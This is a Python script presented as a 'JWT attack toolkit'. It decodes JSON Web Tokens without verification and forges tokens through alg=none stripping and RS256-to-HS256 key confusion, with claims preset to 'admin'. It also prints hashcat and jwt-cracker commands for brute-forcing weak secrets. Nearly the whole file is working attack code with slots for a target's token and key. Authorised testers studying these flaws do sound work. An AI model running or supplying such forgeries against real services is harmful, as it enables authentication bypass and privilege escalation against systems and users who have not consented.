#!/usr/bin/env python3
"""
JWT attack toolkit:
1. Decode any JWT without verification
2. Algorithm confusion: RS256 → HS256 (sign with public key as HMAC secret)
3. alg=none bypass
4. Weak secret brute-force hint
"""
import base64, json, hmac, hashlib, sys

# ── fill in ───────────────────────────────────────────────────────────────────
ORIGINAL_TOKEN = ""       # paste the JWT here
PUBLIC_KEY_PEM = ""       # paste PEM content (for RS256→HS256 attack)
TARGET_CLAIMS  = {        # claims you want to forge
    "role": "admin",
    "user": "admin",
    # "sub": "1",
}
# ─────────────────────────────────────────────────────────────────────────────


def b64_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str):
    """Decode and pretty-print a JWT without verifying."""
    parts = token.split(".")
    header  = json.loads(b64_decode(parts[0]))
    payload = json.loads(b64_decode(parts[1]))
    print("Header: ", json.dumps(header, indent=2))
    print("Payload:", json.dumps(payload, indent=2))
    return header, payload


def forge_none_alg(token: str, new_claims: dict) -> str:
    """Strip signature, set alg=none."""
    header, payload = decode_jwt(token)
    header["alg"] = "none"
    payload.update(new_claims)
    h = b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    forged = f"{h}.{p}."
    print("\n[alg=none forged token]\n", forged)
    return forged


def forge_hs256_with_pubkey(token: str, public_key_pem: str, new_claims: dict) -> str:
    """
    RS256→HS256 confusion: sign new token with HS256 using the RSA public key as the secret.
    The server must accept both algorithms for this to work.
    """
    header, payload = decode_jwt(token)
    header["alg"] = "HS256"
    payload.update(new_claims)

    secret = public_key_pem.encode() if isinstance(public_key_pem, str) else public_key_pem

    h = b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    forged = f"{h}.{p}.{b64_encode(sig)}"
    print("\n[HS256/pubkey forged token]\n", forged)
    return forged


def crack_secret_hint():
    """Hint: use hashcat or jwt-cracker for weak secrets."""
    print("""
Crack weak HMAC secret:
  hashcat -a 0 -m 16500 '<token>' wordlist.txt
  # or
  pip install jwt-cracker && jwt-cracker '<token>' wordlist.txt
    """)


if __name__ == "__main__":
    if not ORIGINAL_TOKEN:
        sys.exit("Set ORIGINAL_TOKEN at the top of the file")

    print("=== Decoded JWT ===")
    decode_jwt(ORIGINAL_TOKEN)

    print("\n=== alg=none attack ===")
    forge_none_alg(ORIGINAL_TOKEN, TARGET_CLAIMS)

    if PUBLIC_KEY_PEM:
        print("\n=== RS256→HS256 confusion ===")
        forge_hs256_with_pubkey(ORIGINAL_TOKEN, PUBLIC_KEY_PEM, TARGET_CLAIMS)

    crack_secret_hint()
